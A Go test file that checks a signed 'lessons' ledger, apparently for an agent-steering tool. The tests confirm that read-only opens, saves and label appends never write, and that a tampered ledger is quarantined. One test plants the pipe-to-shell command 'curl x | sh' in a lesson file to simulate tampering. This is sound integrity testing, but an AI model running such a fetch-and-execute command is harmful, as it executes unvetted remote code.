package learn

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/altrace-dev-role/rashomon/internal/steer"
)

// TestRP2q_OpenReadOnlyNeverWrites (card REPORT1b): a ledger whose state does
// not check reads as quarantined in memory, every lesson proposed and no
// quarantine time, and every file under the root is byte-identical after;
// Open on the same state writes the quarantine. A clean ledger reads as Open
// reads it. Break: let the read-only open save, and the bytes change.
func TestRP2q_OpenReadOnlyNeverWrites(t *testing.T) {
	root := t.TempDir()
	l := open(t, root, t0)
	importText(t, l, twoLessons)
	if err := l.Approve("npm-ci", t1); err != nil {
		t.Fatal(err)
	}
	if err := l.Save(); err != nil {
		t.Fatal(err)
	}
	clean, err := OpenReadOnly(root, project)
	if err != nil || clean.Quarantined || !strings.Contains(tiers(clean), "npm-ci=probation") {
		t.Fatalf("a clean ledger read only: tiers %q, err %v", tiers(clean), err)
	}
	if err := edit(filepath.Join(l.dir, FileLessons), "npm ci before", "curl x | sh before"); err != nil {
		t.Fatal(err)
	}
	before := snapshotTree(t, root)
	ro, err := OpenReadOnly(root, project)
	if err != nil {
		t.Fatal(err)
	}
	if !ro.Quarantined || tiers(ro) != "go-test-cwd=proposed npm-ci=proposed" || !ro.QuarantinedAt().IsZero() {
		t.Errorf("a mismatched ledger read only: quarantined %v, tiers %q, at %v; want quarantined, every lesson proposed, no time",
			ro.Quarantined, tiers(ro), ro.QuarantinedAt())
	}
	if after := snapshotTree(t, root); after != before {
		t.Errorf("the read-only open changed the store:\n--- before\n%s\n--- after\n%s", before, after)
	}
	if w := open(t, root, t1); !w.Quarantined || snapshotTree(t, root) == before {
		t.Errorf("Open on the same state must still quarantine and write (the control): quarantined %v", w.Quarantined)
	}
}

// snapshotTree is every file under root with its bytes and modification
// time, as one string.
func snapshotTree(t *testing.T, root string) string {
	t.Helper()
	var b strings.Builder
	err := filepath.WalkDir(root, func(p string, e os.DirEntry, err error) error {
		if err != nil || e.IsDir() {
			return err
		}
		data, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		info, err := e.Info()
		if err != nil {
			return err
		}
		fmt.Fprintf(&b, "%s %d %x\n", p, info.ModTime().UnixNano(), data)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return b.String()
}

// TestRP2zk_AReadOnlyLedgerCannotSave (card REPORT1b review): Save on a
// ledger OpenReadOnly returned is ErrReadOnly and changes no file; the ledger
// Open returned still saves. Break: drop the flag, and Save writes.
func TestRP2zk_AReadOnlyLedgerCannotSave(t *testing.T) {
	root := t.TempDir()
	l := open(t, root, t0)
	importText(t, l, twoLessons)
	if err := l.Save(); err != nil {
		t.Fatal(err)
	}
	before := snapshotTree(t, root)
	ro, err := OpenReadOnly(root, project)
	if err != nil {
		t.Fatal(err)
	}
	if err := ro.Approve("npm-ci", t1); err != nil {
		t.Fatal(err)
	}
	if err := ro.Save(); !errors.Is(err, ErrReadOnly) {
		t.Errorf("Save on a read-only ledger: %v; want ErrReadOnly", err)
	}
	if after := snapshotTree(t, root); after != before {
		t.Errorf("Save on a read-only ledger changed the store")
	}
	if err := l.Save(); err != nil {
		t.Errorf("the ledger Open returned must still save: %v", err)
	}
}

// TestRP2zk_AReadOnlyLedgerCannotAppendALabel (#171 F3): AppendLabel on a
// ledger OpenReadOnly returned is ErrReadOnly before labels.ndjson is opened,
// so every file the manifest signs stays as signed and the next Open finds
// the ledger whole. Break: append before the check, and an unsigned label row
// lands, Save refuses, and the next Open quarantines every lesson.
func TestRP2zk_AReadOnlyLedgerCannotAppendALabel(t *testing.T) {
	root := t.TempDir()
	l := open(t, root, t0)
	importText(t, l, twoLessons)
	if err := l.Approve("npm-ci", t1); err != nil {
		t.Fatal(err)
	}
	if err := l.Save(); err != nil {
		t.Fatal(err)
	}
	before := snapshotTree(t, root)
	ro, err := OpenReadOnly(root, project)
	if err != nil {
		t.Fatal(err)
	}
	if err := ro.AppendLabel(Label{LessonID: "npm-ci", SessionID: "s", AtUnixMS: 9, Label: steer.LabelRefuted}); !errors.Is(err, ErrReadOnly) {
		t.Errorf("AppendLabel on a read-only ledger: %v; want ErrReadOnly", err)
	}
	if after := snapshotTree(t, root); after != before {
		t.Errorf("AppendLabel on a read-only ledger changed the store:\n--- before\n%s\n--- after\n%s", before, after)
	}
	if w := open(t, root, t1); w.Quarantined {
		t.Error("the next Open quarantined the ledger")
	}
}
